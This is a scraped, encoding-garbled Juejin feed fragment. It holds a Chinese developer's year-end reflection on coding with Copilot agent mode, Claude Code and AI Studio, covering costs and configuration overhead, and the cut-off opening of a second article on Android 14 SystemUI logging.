pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Agent å¤§çˆ†å‘çš„ä¸€å¹´ï¼Œæˆ‘å†™ä»£ç çš„æ–¹å¼ä¹ŸåŠ å…¥äº†é™¤æ‰‹å·¥å†™ä¹‹å¤–çš„å…¶ä»–ä¸¤ç§æ–¹å¼ã€‚</p>
<h2 data-id="heading-0">ä½¿ç”¨ Copilot debug å’Œ å†™æ ·æ¿ä»£ç </h2>
<p>åœ¨å»å¹´æˆ‘ä½¿ç”¨AIå†™ä»£ç çš„æ—¶å€™ï¼Œæœ€å¤šçš„åœºæ™¯è¿˜æ˜¯é—®è§£å†³æ–¹æ¡ˆï¼Œä»Šå¹´æ¨¡å‹çš„ agent èƒ½åŠ›å¼€å‘å‡ºæ¥ä¹‹åï¼Œæ›´å¤šçš„æ—¶å€™æ˜¯ç”¨æ¥ç›´æ¥ debug å’Œå†™ æ ·æ¿ä»£ç ã€‚</p>
<h3 data-id="heading-1">debug</h3>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œdebug çš„è¿‡ç¨‹æ˜¯ï¼Œé‡åˆ°é—®é¢˜ï¼Œæˆ‘åˆ¤æ–­é—®é¢˜å¯èƒ½å‡ºåœ¨å“ªä¸ªé¡µé¢ï¼Œæ˜¯å“ªä¸ªåŠŸèƒ½ï¼Œé€šè¿‡ä»€ä¹ˆæ“ä½œå¤ç°çš„ï¼Œç„¶åæˆ‘ä¼šåœ¨ vscode çš„ chat æ¡†å¼•å…¥å¯¹åº”çš„æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠæ“ä½œè¿‡ç¨‹å’Œé”™è¯¯ä»¥åŠæˆ‘çš„çŒœæµ‹éƒ½è¾“å…¥è¿›å»ï¼Œå¼€å¯ agent æ¨¡å¼ï¼Œå‘é€ï¼Œç„¶åç­‰å¾…ç»“æœè¿”å›ã€‚ä¸€å¼€å§‹ï¼Œåœ¨ claude sonnet 3.5,3.7çš„å¾ˆå¤šæ—¶å€™å…¶å®æ²¡æœ‰é‚£ä¹ˆå¥½ç”¨ï¼Œä¼šç»™å¾ˆå¤šçœ‹ä¼¼æ”¹å¯¹äº†ä½†æ˜¯å†å»æ“ä½œä¸€éè¿˜æ˜¯æ²¡ç”¨çš„ä»£ç ï¼Œä¸å¾—ä¸è¯´è¿™ä¸ªæ˜¯çœŸçš„æµªè´¹äº†ä¸å°‘æ—¶é—´ï¼Œæ¢åœ¨ä»¥å‰è‡ªå·±æ—©éƒ½æ”¹å®Œäº†ï¼Œè¿˜æœ‰è€å¿ƒåœ¨è¿™å’Œå®ƒèŠå™¢ã€‚ä½†æ˜¯æƒ³äº†æƒ³ï¼Œåé¢æ¨¡å‹èƒ½åŠ›æå‡äº†å’ŒAIåä½œå¿…ä¸å¯å°‘ï¼Œä¹Ÿå°±ç»§ç»­å’Œå®ƒâ€œæ²Ÿé€šâ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab4daaa4845648c69af26409fca2bbcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zu-5Lit6Iiq57q_5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589878&amp;x-signature=QMf6Dv9UjYk%2F5bmV6xxFvFDQujM%3D" alt="" loading="lazy"/></p>
<p>åé¢å‘ç°å¯ä»¥ä¸è®©å®ƒä¸€æ­¥ç›´æ¥ä¿®æ”¹ï¼Œè€Œæ˜¯è®©å®ƒå…ˆç¡®å®šé—®é¢˜å…·ä½“å‡ºç°åœ¨å“ªä¸€è¡Œæˆ–è€…æ˜¯ç”±äºå“ªä¸ªè®¾è®¡å¼•èµ·çš„ï¼Œå…ˆåŠ ä¸Šè°ƒè¯•æ—¥å¿—ï¼Œé€šè¿‡è°ƒè¯•æ—¥å¿—æ¥ç¡®å®šé—®é¢˜ï¼Œæœ€åä¸€æ­¥æ‰æ˜¯æ”¹å…·ä½“çš„ä¸šåŠ¡ä»£ç ã€‚</p>
<h3 data-id="heading-2">å†™æ ·æ¿ä»£ç </h3>
<p>æ–°åŠŸèƒ½é¡µé¢çš„å¼€å‘ï¼Œä¸ºäº†ç¬¦åˆé¡µé¢é£æ ¼ï¼Œä»¥åŠä¸€äº›æ¥å£å¤ç”¨ï¼Œä¼šéœ€è¦å†™æ ·æ¿ä»£ç ã€‚è¿™ç§æ ·æ¿ä»£ç åˆä¸åƒåŠŸèƒ½å¤ç”¨è¦æ˜¯åšæˆé«˜åº¦æŠ½è±¡çš„åˆ°æ—¶å€™ä¸ªæ€§åŒ–åˆå¤ªéº»çƒ¦ï¼Œäºæ˜¯ä¹‹å‰æ˜¯æ‰‹åŠ¨å¤åˆ¶ä¸€ä»½ï¼Œç„¶åä¿®ä¿®æ”¹æ”¹ï¼Œå¯èƒ½è¦å‡ ä¸ªå°æ—¶ï¼Œä½†æ˜¯ä»Šå¹´å°±å®Œå…¨ä¸ä¸€æ ·äº†ã€‚é‡åˆ°è¿™ç§æƒ…å†µç›´æ¥è®©AIå»åšï¼Œæˆ‘æŠŠå‚è€ƒé¡µé¢å¼•å…¥åšä¸Šä¸‹æ–‡ï¼Œç„¶åå†æŠŠæ–°é¡µé¢çš„ä¸ªæ€§åŒ–éœ€æ±‚åŠ ä¸Šï¼Œå‘é€ä¹‹åè¿‡å‡ åˆ†é’Ÿé¡µé¢å°±å‡ºæ¥äº†ï¼Œç„¶åå†è‡ªå·±è°ƒæ•´ä¸€ä¸‹ï¼Œæœ€å¤šä¹Ÿå°±10åˆ†é’Ÿå°±æŠŠæ ·æ¿ä»£ç éƒ¨åˆ†æå®Œäº†ã€‚</p>
<h2 data-id="heading-3">ä½¿ç”¨ Claude code è¿›è¡Œ vibe coding</h2>
<p>Vibe coding è¿™ä¸ªæ¦‚å¿µä»Šå¹´ç‰¹åˆ«ç«çƒ­ï¼Œç»å¸¸æœ‰äººè¯´è‡ªå·±ä¸æ‡‚æŠ€æœ¯çš„æœ‹å‹åˆ©ç”¨ vibe coding å¼€å‘äº†è‡ªå·±çš„ app èµšäº†é’±æˆ–è€…å®ç°äº†é›¶çš„çªç ´ä¹‹ç±»çš„ã€‚ç‰¹åˆ«æ˜¯ Claude codeï¼ˆåæ–‡ç®€ç§° ccï¼‰ å’Œ aistudio çš„æ¨å‡ºå’Œæµè¡Œã€‚å‰è€…æ˜¯å®Œå…¨çš„å¼•é¢†äº†è¿™è‚¡é£æ½®ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€è®©AIæ­å»ºé¡¹ç›®ï¼Œå¼€å‘åŠŸèƒ½ï¼Œè‡ªä¸»debugï¼Œæäº¤ä»£ç åˆ°githubï¼Œç”šè‡³è¿è¡Œåœ¨éƒ¨ç½²è¿‡ç¨‹ã€‚è€Œåè€…åˆ™æ˜¯å‡­å€Ÿ google ç”Ÿæ€å’Œ gemini3 çš„å¤šæ¨¡æ€ SOTA èƒ½åŠ›æ„å»ºäº†ä¸€ä¸ªä»å¼€å‘åˆ°éƒ¨ç½²éƒ½åœ¨ä¸€ä¸ªåœ°æ–¹çš„å®Œç¾ä½“éªŒã€‚</p>
<h3 data-id="heading-4"><code>Feishu Doc Exporter</code></h3>
<p>æˆ‘ç”¨ cc ä¸»è¦æ˜¯åœ¨å°é¡¹ç›®ï¼Œæˆ–è€…è¯´ demo æ¼”ç¤ºè¿™ç§æƒ…å†µã€‚æ¯”å¦‚æˆ‘ä»Šå¹´ç”¨é£ä¹¦æ¯”è¾ƒå¤šï¼Œæˆ‘å‘ç°æˆ‘è‡ªå·±è¦æŠŠé£ä¹¦æ–‡æœ¬åŒæ­¥åˆ°å…¬ä¼—å·çš„æ—¶å€™ï¼Œæ–‡æ¡£æ ¼å¼ä¼šä¸¢ï¼Œäºæ˜¯æˆ‘çœ‹chrome store é‡Œæ²¡æœ‰ä¹‹åï¼Œå°±äº§ç”Ÿäº†å†™ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„æƒ³æ³•ï¼Œäºæ˜¯å°±ç”¨ cc æ¥å®Œæˆè¿™ä»¶äº‹ï¼Œè¿™ä¸ªé¡¹ç›®å« <a href="https://link.juejin.cn?target=http%3A%2F%2Fchromewebstore.google.com%2Fdetail%2Ffeishu-doc-exporter%2Fbinjgfnbkdfeknemgcidljibfjkjmcjp%3Futm_source%3Dext_app_menu" target="_blank" title="http://chromewebstore.google.com/detail/feishu-doc-exporter/binjgfnbkdfeknemgcidljibfjkjmcjp?utm_source=ext_app_menu" ref="nofollow noopener noreferrer">Feishu Doc Exporter</a> ã€‚è¿™ä¸ªé¡¹ç›®æˆ‘ä»å¤´åˆ°å°¾æ²¡æœ‰å†™è¿‡ä¸€è¡Œä»£ç ï¼Œæˆ‘åªæ˜¯æŠŠé£ä¹¦çš„å‰æ®µå…ƒç´ ç»“æ„å‘ç»™å®ƒï¼Œç„¶åæŠŠæˆ‘çš„éœ€æ±‚è¯´äº†ã€‚åœ¨æœ€è¿‘çš„æ›´æ–°é‡Œï¼Œå®ƒç”šè‡³æŠŠæˆ‘ç»™çš„å›¾ç‰‡è‡ªåŠ¨åˆ‡åˆ†äº†ï¼Œå› ä¸ºå®ƒè§‰å¾—è¿™ä¸ªå›¾ç‰‡å¤ªå¤§ä¸åˆ©äºå®¡æ ¸ã€‚</p>
<p>ä½¿ç”¨ cc å†™ä»£ç å”¯ä¸€æ‹…å¿ƒçš„æ˜¯é’±åŒ…ã€‚ä¹Ÿæ­£å› ä¸ºè¿™ä¸ªæˆ‘æ‰çŸ¥é“Lç«™ï¼Œæ‰çŸ¥é“å¾ˆå¤šå…¬ç›Šç«™ï¼Œè¿˜æœ‰å¾ˆå¤šä½ä»·çš„ä¸­è½¬ç«™ï¼Œè¯´åˆ°è¿™ä¸ªæˆ‘çœŸçš„å¾ˆæœŸå¾…å›½äº§AIçš„å´›èµ·ï¼Œåˆ°æ—¶å€™ç›´æ¥ç”¨å›½å†…çš„æ¨¡å‹ï¼ŒçœŸå¥½ï¼åŠ æ²¹å•Šï¼Œminimax å’Œ glm å’Œ deepseek å’Œ qwenï¼</p>
<h3 data-id="heading-5">å‚åŠ  Aistudio çš„é»‘å®¢æ¾æ´»åŠ¨</h3>
<p>å…¶å®è¿™ä¸€èŠ‚æ¯”è¾ƒåƒäº§å“ç»ç†ï¼Œå½“ç„¶æˆ‘è¿™å‡ å¹´æˆ‘è®¤ä¸ºæˆ‘ä¹Ÿæ²¡é‡åˆ°å‡ ä¸ªéå¸¸ç‰›çš„äº§å“ç»ç†ã€‚</p>
<p>åœ¨é»‘å®¢æ¾æ´»åŠ¨ä¸­ï¼Œåœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Faistudio.google.com%2Fprompts%2Fnew_chat" target="_blank" title="https://aistudio.google.com/prompts/new_chat" ref="nofollow noopener noreferrer">aistudio</a> é‡Œæˆ‘ç›´æ¥æ„å»ºäº†ä¸€ä¸ªä»Šå¹´appleçš„å¹´åº¦appã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7e4dc6cc54c547fdb86450ad90a5b5b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zu-5Lit6Iiq57q_5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589878&amp;x-signature=EGZ3EvqjDvUcjnk4zhi%2FOeaAEmE%3D" alt="image.png" loading="lazy"/>
æˆ‘çš„ä½“éªŒæ˜¯ï¼Œåœ¨è¿™ä¸ªç¯å¢ƒé‡Œæˆ‘å°±åªéœ€è¦è¯´è¯´è¯´å°±åƒï¼Œå“ªé‡Œä¸å¯¹æˆ‘å°±è¯´ï¼Œæ”¹æ•´ä½“é¢œè‰²æˆ‘å°±è¯´æ¢ä¸ªæ›´å¯çˆ±çš„é¢œè‰²ï¼Œæ”¹å¸ƒå±€æˆ‘å°±è¯´æƒ³æƒ³ apple ä¼šæ€ä¹ˆè®¾è®¡è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<p>åŠ å…¥äº† google çš„å¤šæ¨¡æ€åŠŸèƒ½è¯†åˆ«ç‰©å“çš„åç§°å’Œè‹±æ–‡ï¼Œè¿‡åº¦æ•ˆæœï¼Œè¿˜æœ‰å›½é™…åŒ–éœ€æ±‚ï¼Œæ”¯æŒä¸åŒæ¯è¯­å’Œç›®æ ‡è¯­è¨€ï¼Œè¿™äº›è´¹æ—¶è´¹åŠ›çš„äº‹ï¼Œåœ¨è¿™é‡Œå°±æ˜¯å‡ å¥è¯ï¼Œå‡ åˆ†é’Ÿã€‚</p>
<p>So fastï¼Œso hardï¼</p>
<p>ä¸€æ™šä¸Šæˆ‘æ”¹äº†äº”å…­ä¸ƒå…«éã€‚</p>
<h2 data-id="heading-6">æˆ‘é‡åˆ°çš„é—®é¢˜</h2>
<h3 data-id="heading-7">è´µï¼ŒçœŸçš„è´µ</h3>
<p>ç¬¬ä¸€ä¸ªå¤§é—®é¢˜å°±æ˜¯å¤ªè´µäº†ï¼Œå¥½ç”¨çš„æ¨¡å‹ä»·æ ¼å¤ªè´µäº†ã€‚æœ€æ–°çš„ opus æ¨¡å‹ä»·æ ¼æ˜¯ sonnet çš„3å€ï¼Œè€Œæ— è®ºæ˜¯ cursor è¿˜æ˜¯ claude æˆ–è€… openai åŸºç¡€ä¼šå‘˜éƒ½æ˜¯ 20 ç¾åˆ€ï¼Œç”¨é‡å®Œå…¨ä¸å¤Ÿç”¨ï¼Œè€Œæœ€æ–°çš„æ¨¡å‹å¾€å¾€èƒ½åŠ›éƒ½æ›´å¼ºï¼Œä½“éªŒè¿‡ä¹‹åä¼šå¾ˆéš¾å†ç”¨è€æ¨¡å‹äº†ã€‚</p>
<h3 data-id="heading-8">ä½¿ç”¨èµ·æ¥é—¨æ§›å¾ˆå¤š</h3>
<ul>
<li>
<p>é—¨æ§›é«˜
é¦–å…ˆç¬¬ä¸€ä¸ªå°±æ˜¯å›½å†…èƒ½ç›´æ¥ä½¿ç”¨çš„éƒ½è½åã€‚æ¯”å¦‚ trae å›½å†…å°±åªèƒ½ç”¨è½åæœ€å‰æ²¿ä¸€ä¸¤ä¸ªç‰ˆæœ¬çš„æ¨¡å‹ï¼Œcodebuddy å›½å†…ç‰ˆæœ¬ä¹Ÿæ˜¯ï¼Œqorder ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæƒ³ç”¨æœ€å‰æ²¿çš„æ¨¡å‹ï¼Œå°±è¦ç”¨ä»–ä»¬çš„å›½é™…ç‰ˆæˆ–è€…æƒ³åˆ«çš„åŠæ³•ã€‚</p>
</li>
<li>
<p>é…ç½®å¤š
æ— è®ºæ˜¯ vscode çš„ agent èƒ½åŠ›è¿˜æ˜¯ cc çš„è‡ªä¸»ä»£ç†ï¼Œè¿™äº›éƒ½æ˜¯ä½“éªŒèµ·æ¥å¾ˆç¾å¥½ï¼Œä½†æ˜¯æƒ³é™ä½å¼€é”€ï¼Œæƒ³æé«˜å‡†ç¡®ç‡ï¼Œä¼šéœ€è¦å„ç§å„æ ·çš„é…ç½®æ–‡ä»¶ã€‚æˆ‘é¢†å¯¼æœ€è¿‘å‘è§‰ cursor é¢åº¦ç”¨çš„å¾ˆå¿«ï¼Œä¸€æŸ¥å‘ç°æ€ä¹ˆå•æ¬¡ä¼šè¯å‡ åƒä¸‡ tokenã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5ed81a85f5241819b0972277662ce5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zu-5Lit6Iiq57q_5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589878&amp;x-signature=XcbIKM1YiSy5o%2BXqByrsR5Mm2w8%3D" alt="image.png" loading="lazy"/></p>
<p>æ¯”å¦‚ vscode å°±æ¨å‡º <code>.github/agents.md</code> å’Œ <code>.github/copilot-instructions.md</code> ç­‰æ–‡ä»¶æ¥è¿›è¡Œé¡¹ç›®çº§åˆ«çš„å¯¹äº agent æ¯æ¬¡ä¼šè¯çš„å‰æƒ…æè¦ï¼Œè€Œåœ¨ cc ä¸­ï¼Œé…ç½®æ›´æ˜¯å¤šåˆ°è®©äººçœ¼èŠ±ç¼­ä¹±ï¼Œæœ‰å­ä»£ç†ï¼Œå…è®¸æ‰§è¡Œçš„å‘½ä»¤ï¼Œskillsï¼Œå…è®¸çš„ mcp åˆ—è¡¨ç­‰ç­‰ï¼Œè¿™äº›éƒ½éœ€è¦ä½ è‡ªå·±å»é…ç½®ï¼Œå»ç¼–å†™ï¼Œä½ éœ€è¦ç†è§£è¿™äº›é…ç½®æ–‡ä»¶çš„ä½œç”¨ï¼Œæ˜¯ä¸æ˜¯æœ‰ä¸€ç§ <code>webpack</code> çš„æ„Ÿè§‰ï¼Ÿç”šè‡³ cc å¯ä»¥åˆ†ä¸ºå…¨å±€ï¼ˆæ•´å°ç”µè„‘ï¼‰çš„é…ç½®å’Œé¡¹ç›®çº§åˆ«è¿˜æœ‰ç›®å½•çº§åˆ«çš„ï¼Œæˆ‘è‡ªå·±è®¤ä¸ºæŠŠ cc é…ç½®æ–‡ä»¶ç²¾ç»†åŒ–åˆ°è¿™ç§ç¨‹åº¦æ˜¯è¶…çº§å¤æ‚çš„ä¸€ä»¶äº‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7754d84da194e3cae7f0866a123bee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zu-5Lit6Iiq57q_5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767589878&amp;x-signature=9fi7ObgA7HV0LqJ%2BGTu8Lo2H9Ls%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>AIåœ¨ä»Šå¹´å·²ç»ä¸æ˜¯æˆ‘çš„å®ä¹ ç”Ÿäº†ï¼Œè€Œæ˜¯æˆ‘çš„ä»£ç æ­å­ï¼Œæˆ‘å‘å®ƒçŒè¾“éœ€æ±‚ï¼Œæˆ‘ç»™å®ƒè£…é…èƒ½åŠ›ï¼Œè®©å®ƒçŸ¥é“å®ƒè´Ÿè´£çš„é¡¹ç›®è¦æ±‚ï¼Œè®©å®ƒçŸ¥é“ç°åœ¨è¦åšçš„æ˜¯ä»€ä¹ˆï¼Œè®©å®ƒå…ˆæä¸€ç‰ˆå‡ºæ¥ï¼Œç„¶åæˆ‘å†å’Œå®ƒè°ƒè°ƒè°ƒï¼Œæ¥å›å‡ æ¬¡ä¹‹åç®—æ˜¯æŠŠä»»åŠ¡å®Œæˆäº†ï¼Œæˆ‘çš„æ”¶è·å°±æ˜¯åŸæ¥éœ€æ±‚æ˜¯è¿™æ ·å»è€ƒè™‘çš„ï¼Œä»£ç èƒ½åŠ›çš„å¢é•¿ä¸»è¦æ˜¯ä½“ç°åœ¨å’ŒAIè¯´éœ€æ±‚çš„è¿‡ç¨‹ä¸­æˆ‘çš„é¢„æœŸä¹Ÿè¶Šæ¥è¶Šæ¸…æ™°äº†ã€‚</p>
<p>2026å¹´æˆ‘æ„Ÿè§‰å¯èƒ½æ›´å¤šæ˜¯è¦vibe codingäº†ï¼Œè™½ç„¶å…¬å¸ä¹Ÿæ²¡æœ‰é‚£ä¹ˆå¤šæ–°äº§å“è¦æ¨ï¼Œä½†æ˜¯å¯¹äºä¸ªäººå»è§£å†³é‡åˆ°çš„é—®é¢˜ï¼Œå»ä¸ºäº†è‡ªå·±çš„ä¸€ç‚¹å¥½å¥‡å¿ƒæˆ–è€…ç©ï¼Œå¯èƒ½æ›´å®¹æ˜“å»å†™ä»£ç äº†ï¼Œåæ­£ä¸ç”¨æ‰‹å†™äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®‰å“14å‰–æSystemUIçš„ShadeLogger/LogBufferæ—¥å¿—åŠ¨æ€æ§åˆ¶è¾“å‡ºdumpsyæœºåˆ¶]]></title>    <link>https://juejin.cn/post/7588461466599096371</link>    <guid>https://juejin.cn/post/7588461466599096371</guid>    <pubDate>2025-12-29T03:34:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588461466599096371" data-draft-id="7588464673286307867" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®‰å“14å‰–æSystemUIçš„ShadeLogger/LogBufferæ—¥å¿—åŠ¨æ€æ§åˆ¶è¾“å‡ºdumpsyæœºåˆ¶"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T03:34:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·8127482815120"/> <meta itemprop="url" content="https://juejin.cn/user/2711830721731422"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®‰å“14å‰–æSystemUIçš„ShadeLogger/LogBufferæ—¥å¿—åŠ¨æ€æ§åˆ¶è¾“å‡ºdumpsyæœºåˆ¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2711830721731422/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·8127482815120
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T03:34:27.000Z" title="Mon Dec 29 2025 03:34:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯ï¼š</h2>
<p>çœ‹SystemUIçš„é”å±ç›¸å…³ä»£ç æ—¶å€™å‘ç°SystemUIæœ‰ä¸€ä¸ªæ—¥å¿—æ‰“å°ç›¸å…³çš„æ–¹æ³•è°ƒç”¨ï¼Œç›¸æ¯”äºå¸¸è§„çš„Log.iç›´æ¥å¯ä»¥logcatæŸ¥çœ‹æ–¹å¼è¿˜æ˜¯æ¯”è¾ƒæ–°é¢–ã€‚</p>
<p>å…·ä½“æ—¥å¿—æ‰“å°ä»£ç å¦‚ä¸‹ï¼š
